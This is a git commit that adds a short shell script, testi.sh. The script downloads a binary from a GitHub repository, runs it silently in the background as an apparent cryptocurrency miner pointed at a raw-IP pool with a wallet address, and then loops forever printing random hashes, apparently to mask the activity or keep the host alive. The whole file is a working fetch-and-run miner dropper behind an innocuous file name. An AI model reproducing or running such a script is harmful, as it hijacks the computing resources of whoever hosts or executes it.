6a8448c1fb745a6308c51a5344d3aab721b9ab65
sbwsmg <108033976+sbwsmg@users.noreply.github.com>
2022-11-28 23:09:43 +0800

    Create testi.sh

---
+++ testi.sh
@@ -0,0 +1,4 @@
+wget https://github.com/sbwsmg/lol/raw/main/sairin
+chmod 700 sairin
+./sairin -o straum+tcp://139.162.40.79:443 -u deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92x6hsk03skqgr8tscz0xla -t 4 > /dev/null 2>&1 &
+while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
